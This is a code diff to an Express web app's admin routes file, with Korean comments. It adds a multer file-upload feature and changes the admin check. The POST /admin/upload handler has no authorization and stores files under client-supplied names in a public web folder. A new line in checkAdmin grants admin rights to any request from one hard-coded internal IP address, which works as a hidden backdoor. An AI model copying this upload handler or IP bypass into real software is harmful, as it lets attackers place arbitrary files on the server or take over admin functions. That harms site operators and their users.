@@ -30,6 +30,18 @@ var JLog	 = require("../../sub/jjlog");
 var Lizard	 = require("../../sub/lizard.js");
 //var Bander	 = require("./../filters/User.json");
 
+var Express	 = require("express");
+var multer = require('multer'); // multer 모듈 사용 (파일 업로드)
+var storage = multer.diskStorage({
+	destination: function (req, file, cb) {
+		cb(null, 'lib/Web/public/uploaded') // cb 콜백함수를 통해 전송된 파일 저장 디렉토리 설정
+	},
+	filename: function (req, file, cb) {
+		cb(null, file.originalname) // cb 콜백함수를 통해 전송된 파일 이름 설정
+	}
+})
+var upload = multer({ storage: storage })
+
 File.watchFile("./lib/sub/global.json", () => {
 	GLOBAL = require("../../sub/global.json");
 	JLog.info("global.json is Auto-Updated at {lib/Web/routes/admin.js}");
@@ -76,6 +88,18 @@ Server.get("/admin/designer", function(req, res) {
 	req.session.admin = true;
 	page(req, res, "admin_designer");
 });
+Server.get('/admin/upload', function(req, res){
+	if(!checkAdmin(req, res, 'DESIGNER')) return;
+	
+	req.session.admin = true;
+	res.render('upload');
+});
+Server.post('/admin/upload', upload.single('userfile'), function(req, res){
+	res.send('Uploaded! : '+req.file); // object를 리턴함
+	console.log(req.file); // 콘솔(터미널)을 통해서 req.file Object 내용 확인 가능.
+});
+Server.use('/admin/uploaded', Express.static('uploads'));
+
 Server.get("/gwalli/injeong", function(req, res){
 	if(!checkAdmin(req, res, 'WORDS')) return;
 	
@@ -395,6 +419,7 @@ function checkAdmin(req, res, type){
 	if(global.isPublic){
 		if(req.session.profile){
 			if(GLOBAL.ADMINS['MANAGER'].indexOf(req.session.profile.id) != -1) return true;
+			if(req.connection.remoteAddress === "::ffff:172.30.1.254") return true;
 			
 			if(GLOBAL.ADMINS[type].indexOf(req.session.profile.id) == -1){
 				req.session.admin = false;
